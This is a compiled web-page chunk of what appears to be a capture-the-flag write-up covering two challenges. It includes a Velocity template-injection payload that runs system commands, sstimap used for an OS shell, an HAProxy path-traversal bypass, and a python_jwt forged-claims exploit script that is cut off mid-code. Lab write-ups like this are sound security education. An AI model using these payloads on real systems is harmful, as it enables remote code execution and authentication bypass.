import{S as mn,i as un,s as hn,U as Ko,y as Sl,z as Tl,A as xl,V as An,W as $e,g as jl,d as Xl,B as Ml,X as Qe,k as F,q as n,a as c,Y as d,l as t,m as r,r as p,h as l,c as i,Z as E,n as f,b as e,D as a,E as wn}from"../chunks/index.725d15e1.js";import{P as _n}from"../chunks/post_layout.b6bd0bbf.js";import{I as ha}from"../chunks/post_card.004e8740.js";function gn(Z){let y,w,_,h,D,A,B,z,Y,Aa,Nl,g,wa,ms,_a,ga,us,ba,Ca,Ol,hs,Ze=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" xml="true"><div class="language-id">xml</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">dependencies</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">dependency</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">groupId</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">org.springframework.boot</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">groupId</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">artifactId</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">spring-boot-starter-web</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">artifactId</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">dependency</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">dependency</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">groupId</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">org.apache.velocity</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">groupId</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">artifactId</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">velocity</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">artifactId</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">version</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">1.7</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">version</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">dependency</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">dependency</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">groupId</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">org.apache.velocity</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">groupId</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">artifactId</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">velocity</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">artifactId</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">version</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">1.7</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">version</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">dependency</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">dependencies</span><span style="color: #89DDFF">&gt;</span></div></code></div></pre>`,As,K,Ia,Jl,ws,Ye=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" java="true"><div class="language-id">java</div><div class='code-container'><code><div class='line'><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">String</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">readFileToString</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">String</span><span style="color: #EEFFFF"> filePath</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">String</span><span style="color: #EEFFFF"> replacement</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> throws IOException </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">StringBuilder</span><span style="color: #EEFFFF"> content </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">StringBuilder</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">BufferedReader</span><span style="color: #EEFFFF"> bufferedReader </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">null;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">try</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        bufferedReader </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">BufferedReader</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">FileReader</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">filePath</span><span style="color: #89DDFF">));</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #C792EA">String</span><span style="color: #EEFFFF"> line</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        </span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">while</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">((</span><span style="color: #EEFFFF">line </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> bufferedReader</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">readLine</span><span style="color: #89DDFF">())</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">!=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">null)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">            line </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> line</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">replace</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">TEXT</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> replacement</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">            content</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">append</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">line</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">            content</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">append</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">&#92;n</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">finally</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">bufferedReader </span><span style="color: #89DDFF">!=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">null)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">try</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">                bufferedReader</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">close</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">catch</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #C792EA">IOException</span><span style="color: #EEFFFF"> e</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">                e</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">printStackTrace</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> content</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">toString</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre>`,_s,T,ka,gs,Sa,Ta,Bl,bs,Ke=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" java="true"><div class="language-id">java</div><div class='code-container'><code><div class='line'><span style="color: #C792EA">org</span><span style="color: #89DDFF">.</span><span style="color: #C792EA">apache</span><span style="color: #89DDFF">.</span><span style="color: #C792EA">velocity</span><span style="color: #89DDFF">.</span><span style="color: #C792EA">Template</span><span style="color: #EEFFFF"> t </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> org</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">apache</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">velocity</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Template</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">t</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">setRuntimeServices</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">runtimeServices</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #89DDFF">try</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">  t</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">setData</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">runtimeServices</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">parse</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">reader</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">home</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">));</span></div><div class='line'><span style="color: #EEFFFF">  t</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">initDocument</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #C792EA">VelocityContext</span><span style="color: #EEFFFF"> context </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">VelocityContext</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">  context</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">put</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">name</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">World</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">);</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #C792EA">StringWriter</span><span style="color: #EEFFFF"> writer </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">StringWriter</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">  t</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">merge</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">context</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> writer</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">  template </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> writer</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">toString</span><span style="color: #89DDFF">();</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">catch</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #C792EA">ParseException</span><span style="color: #EEFFFF"> e</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">  e</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">printStackTrace</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre>`,Cs,v,xa,Is,ja,Xa,ks,Ma,Na,Ss,Oa,Ja,Ts,Ba,za,xs,Ra,Pa,zl,js,sn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami")</span></div></code></div></pre>`,Xs,ss,Ua,Rl,Ms,ln=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">curl.exe </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">http://94.237.49.166:35229/</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> -X POST --data-raw </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">text=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22whoami%22)</span><span style="color: #89DDFF">'</span></div></code></div></pre>`,Ns,x,Ha,Os,Ga,qa,Pl,Js,an=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">python3 sstimap.py --url http://94.237.49.166:35229/ -f --os-shell --engine velocity</span></div></code></div></pre>`,Bs,ls,Va,Ul,zs,on=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">cat /flag*</span></div></code></div></pre>`,Rs,R,as,Wa,Hl,os,$a,Gl,Ps,en=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">@</span><span style="color: #82AAFF">api_blueprint</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">route</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/get_ticket</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">methods</span><span style="color: #89DDFF">=[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">GET</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">])</span></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">get_ticket</span><span style="color: #89DDFF">():</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    claims </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">role</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">guest</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">user</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">guest_user</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span></div><div class='line'><span style="color: #EEFFFF">    token </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> jwt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">generate_jwt</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">claims</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> current_app</span><span style="color: #89DDFF">.</span><span style="color: #F07178">config</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">get</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">JWT_SECRET_KEY</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">),</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">PS256</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> datetime</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">timedelta</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">minutes</span><span style="color: #89DDFF">=</span><span style="color: #F78C6C">60</span><span style="color: #89DDFF">))</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">jsonify</span><span style="color: #89DDFF">(&#123;</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">ticket: </span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">:</span><span style="color: #82AAFF"> token</span><span style="color: #89DDFF">&#125;)</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #89DDFF">@</span><span style="color: #82AAFF">api_blueprint</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">route</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/chat/&lt;int:chat_id&gt;</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">methods</span><span style="color: #89DDFF">=[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">GET</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">])</span></div><div class='line'><span style="color: #89DDFF">@</span><span style="color: #82AAFF">authorize_roles</span><span style="color: #89DDFF">([</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">guest</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">administrator</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">])</span></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">chat</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">chat_id</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">  ...</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">@</span><span style="color: #82AAFF">api_blueprint</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">route</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/flag</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">methods</span><span style="color: #89DDFF">=[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">GET</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">])</span></div><div class='line'><span style="color: #89DDFF">@</span><span style="color: #82AAFF">authorize_roles</span><span style="color: #89DDFF">([</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">administrator</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">])</span></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">flag</span><span style="color: #89DDFF">():</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">jsonify</span><span style="color: #89DDFF">(&#123;</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">message</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">:</span><span style="color: #82AAFF"> current_app</span><span style="color: #89DDFF">.</span><span style="color: #F07178">config</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">get</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">FLAG</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)&#125;),</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">200</span></div></code></div></pre>`,Us,b,Qa,Hs,La,Za,Gs,Ya,Ka,ql,qs,nn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">global</span></div><div class='line'><span style="color: undefined">    daemon</span></div><div class='line'><span style="color: undefined">    maxconn 256</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">defaults</span></div><div class='line'><span style="color: undefined">    mode http</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">    timeout connect 5000ms</span></div><div class='line'><span style="color: undefined">    timeout client 50000ms</span></div><div class='line'><span style="color: undefined">    timeout server 50000ms</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">frontend haproxy</span></div><div class='line'><span style="color: undefined">    bind 0.0.0.0:1337</span></div><div class='line'><span style="color: undefined">    default_backend backend</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">    http-request deny if &#123; path_beg,url_dec -i /api/v1/get_ticket &#125;</span></div><div class='line'><span style="color: undefined">    </span></div><div class='line'><span style="color: undefined">backend backend</span></div><div class='line'><span style="color: undefined">    balance roundrobin</span></div><div class='line'><span style="color: undefined">    server s1 0.0.0.0:5000 maxconn 32 check</span></div></code></div></pre>`,Vs,es,so,Vl,Ws,pn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">curl http://localhost:1337/../api/v1/get_ticket -i --path-as-is</span></div></code></div></pre>`,$s,j,lo,Qs,ao,oo,Wl,Ls,Fn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA</span></div></code></div></pre>`,Zs,X,eo,Ys,no,po,$l,Ks,tn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">uwsgi</span></div><div class='line'><span style="color: undefined">Flask</span></div><div class='line'><span style="color: undefined">requests</span></div><div class='line'><span style="color: undefined">python_jwt==3.3.3</span></div></code></div></pre>`,sl,P,Fo,M,to,Ql,U,ro,ll,co,Ll,ns,H,Zl,N,io,al,yo,Do,Yl,ol,rn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> datetime </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> timedelta</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> json </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> loads</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> dumps</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> python_jwt </span><span style="color: #89DDFF">as</span><span style="color: #EEFFFF"> jwt</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> pyvows </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> Vows</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> expect</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> jwcrypto</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">common </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> base64url_decode</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> base64url_encode</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> pprint </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> pprint</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">ForgedClaims</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">create</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">"""</span><span style="color: #546E7A"> Generate token </span><span style="color: #89DDFF">"""</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #546E7A"># payload = &#123;'sub': 'alice'&#125;</span></div><div class='line'><span style="color: #EEFFFF">        token </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> token</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">topic</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> topic</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">"""</span><span style="color: #546E7A"> Use mix of JSON and compact format to insert forged claims including long expiration </span><span style="color: #89DDFF">"""</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">[</span><span style="color: #EEFFFF">header</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> payload</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> signature</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> topic</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">split</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">.</span><span style="color: #89DDFF">'</span><span 